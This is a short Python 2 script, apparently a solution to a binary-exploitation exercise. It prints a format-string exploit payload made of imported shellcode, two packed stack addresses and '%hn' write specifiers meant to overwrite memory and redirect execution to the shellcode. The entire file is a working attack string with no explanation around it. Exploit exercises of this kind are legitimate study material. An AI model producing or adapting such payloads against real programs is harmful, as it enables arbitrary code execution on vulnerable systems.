from shellcode import shellcode
from struct import pack
print shellcode + '\x60' + pack("<I",0xbffedf6e) + pack("<I",0xbffedf6c) + "%49118x%10$hn%05986x%11$hn"
